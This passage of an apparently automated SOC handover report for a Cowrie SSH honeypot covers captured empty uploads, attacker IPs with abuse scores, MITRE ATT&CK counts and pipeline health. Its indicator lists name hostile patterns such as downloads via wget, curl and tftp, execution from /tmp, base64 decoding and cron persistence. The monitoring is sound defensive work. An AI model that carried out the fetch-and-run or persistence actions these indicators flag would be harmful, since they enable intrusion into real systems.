| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `217.60.255[.]130` | IR | SepehrSabz IDC | **100** ⚠️ | 4 |
| `182.52.133[.]240` | TH | TOT Public Company Limited | **100** ⚠️ | 4 |
| `2.249.150[.]53` | SE | Telia Network Services | **100** ⚠️ | 5 |
| `156.236.73[.]11` | JP | Yisu Cloud Ltd | **100** ⚠️ | 2 |
| `37.186.41[.]88` | QA | Vodafone Qatar P.Q.S.C | **100** ⚠️ | 2 |
| `2.180.11[.]118` | IR | mashhad dsl | **100** ⚠️ | 3 |
| `62.122.195[.]14` | RU | Opticom Group AO | **100** ⚠️ | 50 |
| `176.53.159[.]196` | PL | BearShield Technologies S.R.O. | **100** ⚠️ | 50 |
| `78.187.9[.]53` | TR | Turk Telekomunikasyon Anonim Sirketi | **100** ⚠️ | 4 |
| `207.175.229[.]28` | BE | Google LLC | **100** ⚠️ | 1 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 101 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 96 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 11 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 11 |
| [T1003.008](https://attack.mitre.org/techniques/T1003/008) | 1 |

---

## 🔕 False Positive Summary (47 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 3 |
| AbuseIPDB score 16 below threshold 25 | 2 |
| AbuseIPDB score 24 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 40 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 201 cases |
| Tool 34  | Credential Extractor        | ✅ 115 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 12 fingerprints |
| Tool 36  | Command Clustering          | ✅ 5 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 78 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 47 filtered (23.4%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 58 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 20 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 96 priority case(s) shown individually · 21 recon entry/entries in table (5 group(s) consolidating 42 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json (pipeline.yml tools) + data/tool_manifest_enriched.json (enriched_corpus.yml tools) — both auto-generated each run, together tracking all active tools across both workflows, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-08-30T05:12:35Z_
